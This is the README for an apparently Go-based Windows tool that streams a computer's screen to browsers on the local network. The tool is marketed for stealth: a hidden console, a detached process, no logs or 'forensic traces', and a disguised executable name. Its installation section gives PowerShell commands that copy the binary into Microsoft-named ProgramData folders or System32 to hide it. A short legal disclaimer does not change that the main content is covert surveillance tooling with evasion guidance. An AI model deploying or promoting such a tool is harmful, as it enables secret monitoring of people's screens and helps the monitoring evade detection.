# Screen Mirror - Ultra-Stealth Local Network Screen Streaming

High-performance, ultra-low-latency screen mirroring tool with advanced stealth features. Built with Go for Windows.

## ⚡ Quick Start

### Build from Source

```powershell
# Build (prompts for executable name)
.\build.ps1
# Enter name: mirror (or any name you prefer)

# Run with your chosen name
.\mirror.exe start
```

> **Note:** Replace `mirror.exe` with the name you chose during build throughout this guide.

---

## 📋 Commands

```powershell
# Help
.\mirror.exe
.\mirror.exe --help

# Start server
.\mirror.exe start [flags]

# Check status
.\mirror.exe status

# Stop server
.\mirror.exe stop
```

### Start Flags:

| Flag       | Description            | Default | Range   |
| ---------- | ---------------------- | ------- | ------- |
| `-p`       | Server port            | 8080    | 1-65535 |
| `-fps`     | Frames per second      | 60      | 10-120  |
| `-q`       | JPEG quality           | 85      | 1-100   |
| `-clients` | Max concurrent viewers | 3       | 1-10    |
| `-buffer`  | Frame buffer size      | 2       | 1-10    |

### Examples:

```powershell
# Default settings
.\mirror.exe start

# Custom port
.\mirror.exe start -p 9000

# High performance (high FPS, high quality)
.\mirror.exe start -p 8080 -fps 120 -q 95 -clients 5

# Low bandwidth (low FPS, lower quality)
.\mirror.exe start -fps 30 -q 60

# Maximum stealth (low resources)
.\mirror.exe start -fps 20 -q 70 -clients 1
```

---

## 🎯 Example Output

### Starting:

```
✓ Server started on port 8080
  FPS: 60 | Quality: 85 | Max Clients: 3 | Buffer: 2

Access URLs:
  http://192.168.1.10:8080
  http://172.22.16.1:8080
```

### Status:

```
Screen Mirror Status:
==================================================

✓ Server is running (PID: 8216)
```

### Stopping:

```
Stopping Screen Mirror...
✓ Stopped process PID: 8216
✓ Server stopped
```

---

## 🚀 Features

### Performance

- ⚡ **<50ms latency** - WebSocket binary streaming with TCP_NODELAY
- 🎬 **60 FPS default** - Configurable 10-120 FPS
- 🖼️ **Delta encoding** - Only sends changed frames (50-70% bandwidth reduction)
- 💾 **Buffer pooling** - Zero-allocation JPEG encoding
- 🔥 **2MB write buffers** - Optimized for high throughput

### Stealth Features

- 🥷 **Custom naming** - Choose any executable name during build
- 👻 **Hidden console** - No visible window after startup
- 📦 **Single executable** - No installation, no config files
- 🔇 **Zero logging** - No disk writes, no forensic traces
- 🎭 **Detached process** - Survives parent termination
- ⚙️ **Limited resources** - 2 CPU cores, blends with system processes

### Network

- 🌐 **Browser-based viewer** - No app needed on client
- 📱 **Mobile friendly** - Works on phones/tablets
- 🔌 **Auto IP detection** - Shows all network interfaces
- 🚫 **APIPA filtering** - Skips 169.254.x.x addresses
- 🛡️ **Instance protection** - Prevents duplicate servers on same port

---

## 🔧 How It Works

### Capture Pipeline:

```
1. Screen Capture (BitBlt API)
   ↓
2. JPEG Encoding (configurable quality)
   ↓
3. Delta Comparison (5% threshold)
   ↓
4. Frame Buffer (configurable size)
   ↓
5. WebSocket Binary Stream
   ↓
6. Browser Display (blob URLs)
```

### Delta Encoding:

- Compares each frame with previous
- Only sends frame if >5% pixels changed
- Keyframe every 60 frames (guaranteed)
- Reduces bandwidth by 50-70%

### Stealth Mechanisms:

- Custom executable naming (user-defined during build)
- Hidden console window (SW_HIDE after 3s)
- Detached background process (CREATE_NEW_PROCESS_GROUP)
- No config files (all in memory)
- Limited to 2 CPU cores (GOMAXPROCS)
- No logging or disk I/O

---

## 📁 File Structure

```
screen-mirror/
├── main.go           # Core application (~800 lines)
├── viewer.html       # Embedded web viewer
├── build.ps1         # Build script with custom naming
├── go.mod            # Go dependencies
├── go.sum            # Dependency checksums
├── .gitignore        # Git ignore rules
├── README.md         # This file
└── LICENSE           # MIT License

After build: Custom named executable (e.g., mirror.exe)
```

---

## 🛡️ Security & Installation

### Recommended Installation Locations:

**Without Admin (Recommended):**

```powershell
# Copy to hidden system folder (replace <name> with your executable name)
Copy-Item .\mirror.exe "$env:ProgramData\Microsoft\Windows\mirror.exe"

# Run from there
& "$env:ProgramData\Microsoft\Windows\mirror.exe" start
```

**With Admin (Maximum Stealth):**

```powershell
# Copy to System32 (requires admin, replace <name> with your executable name)
Copy-Item .\mirror.exe "C:\Windows\System32\mirror.exe"

# Run
C:\Windows\System32\mirror.exe start
```

---

## 🐛 Troubleshooting

**Can't connect from phone?**

```powershell
# Check server status and get URL
.\mirror.exe status

# Verify same Wi-Fi network
ipconfig

# Check Windows Firewall (allow on first run)
```

**"Server is already running" error?**

```powershell
# Stop existing instance first
.\mirror.exe stop

# Then start
.\mirror.exe start
```

**Port already in use?**

```powershell
# Use different port
.\mirror.exe start -p 9000
```

**Performance issues?**

```powershell
# Lower FPS and quality
.\mirror.exe start -fps 30 -q 70

# Check network with Task Manager
```

**Build errors?**

```powershell
# Update dependencies
go mod tidy

# Rebuild
.\build.ps1
```

---

## 🧰 Tech Stack

| Component          | Technology                                     |
| ------------------ | ---------------------------------------------- |
| **Language**       | Go 1.21+                                       |
| **Screen Capture** | github.com/kbinani/screenshot (Windows BitBlt) |
| **WebSocket**      | github.com/gorilla/websocket                   |
| **Image Encoding** | image/jpeg (stdlib)                            |
| **Binary Size**    | Stripped with `-ldflags="-s -w"`               |
| **Platform**       | Windows (x64)                                  |

---

## ⚖️ Legal Notice

**⚠️ IMPORTANT: For Authorized Use Only**

This tool captures screen content and should **only** be used:

- ✅ On systems you own
- ✅ With explicit permission from system owner
- ✅ For legitimate security testing
- ✅ For educational purposes

**Unauthorized use may violate:**

- Computer Fraud and Abuse Act (CFAA)
- Electronic Communications Privacy Act (ECPA)
- State wiretapping laws
- Corporate security policies

**The authors assume NO liability for misuse.**

---

## 📝 License

MIT License - See LICENSE file for details.

For educational and authorized security testing purposes only.

---

## 🎓 Educational Value

This project demonstrates:

- High-performance screen capture in Go
- WebSocket real-time streaming
- Delta encoding optimization
- Windows API integration
- Stealth techniques in system programming
- Buffer pooling and zero-allocation patterns

---

## 🤝 Contributing

This is an educational project. Contributions welcome for:

- Performance optimizations
- Cross-platform support (macOS, Linux)
- Additional stealth techniques
- Documentation improvements

---

## 📚 Additional Resources

- [Go Documentation](https://go.dev/doc/)
- [WebSocket Protocol RFC](https://datatracker.ietf.org/doc/html/rfc6455)

---

**Built with Go. Optimized for stealth. Made for education.** 🚀


